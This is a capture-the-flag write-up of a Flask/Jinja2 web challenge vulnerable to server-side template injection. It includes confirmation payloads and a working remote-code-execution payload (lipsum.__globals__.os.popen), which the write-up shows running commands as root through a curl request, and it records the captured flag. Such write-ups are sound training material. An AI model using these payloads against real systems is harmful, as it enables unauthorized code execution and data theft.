# Templated Malice

- **Category:** web
- **Points:** 300
- **Branch:** `chal/web-templated-malice`
- **Target:** `http://54.72.82.22:8020`
- **Status:** ✅ SOLVED

## Flag

```
safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}
```

## Fingerprint

```
Server: Werkzeug/3.1.9 Python/3.11.16   (Flask / Jinja2)
```

Themed page: **"MOONLIGHT CLUB"** K-pop fan club — "Your bias. Your message.
A fan greeting made just for you." Single form: one `message` field, POSTed to `/`.

## The bug: server-side template injection

The `message` value is concatenated into a Jinja2 template and rendered
(`render_template_string`), so the full Jinja2 expression language is available.

Confirmation ladder:

| Payload | Result |
|---|---|
| `{{7*7}}` | `49` |
| `{{7*"7"}}` | `7777777` (proves Jinja string-multiply, not just reflection) |
| `{{self}}` | `<TemplateReference None>` |
| `{{config}}` | Flask `Config` object dump |

## Exploitation

`lipsum` is a Jinja2 global whose `__globals__` reaches the real Python module
namespace, giving `os`:

```jinja
{{lipsum.__globals__.os.popen("id").read()}}
# -> uid=0(root) gid=0(root) groups=0(root)
```

The container runs the Flask app **as root**, so this is full control.

```bash
curl -s -X POST http://54.72.82.22:8020/ \
  --data-urlencode 'message={{lipsum.__globals__.os.popen("cat /app/flag").read()}}'
```

App layout (from `ls -la /app`):

```
-rw-r--r-- 1 root root   41 Sep 28 20:45 flag
-rw-r--r-- 1 root root 5449 Sep 30 12:49 ssti1.py
-rw-r--r-- 1 root root 1157 Oct  1 17:40 docker-compose.yml   (at / not /app)
```

`/app/flag` holds the flag. See `solve.py`.

## Note

`{{config}}` returns the Flask config object, which is a useful fallback when the
flag sits in `app.config['FLAG']` rather than on disk. Here it was on disk.

## Related

`ssti1.py` in the container confirms the intended vector. **SSTI Secrets (:8040)**
is very likely the same class.
